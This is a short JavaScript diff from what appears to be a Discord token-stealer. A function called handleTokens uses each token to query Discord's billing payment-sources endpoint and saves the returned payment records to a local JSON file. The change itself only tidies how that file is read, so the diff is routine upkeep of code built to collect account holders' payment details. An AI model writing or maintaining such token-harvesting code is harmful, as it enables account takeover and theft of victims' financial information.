@@ -95,7 +95,7 @@ const handleTokens = async (tokens, resolve) => {
       const { data } = await axios.get('https://discord.com/api/v10/users/@me/billing/payment-sources', {
         headers: { Authorization: token, 'User-Agent': userAgent }
       });
-      let info = JSON.parse(readFileSync(jsonFile).toString());
+      let info = JSON.parse(readFileSync(jsonFile, 'utf8'));
       if (!info.billing) info.billing = [];
       data.forEach(billing => {
         if (!info.billing.find(b => b.id === billing.id)) info.billing.push(billing);
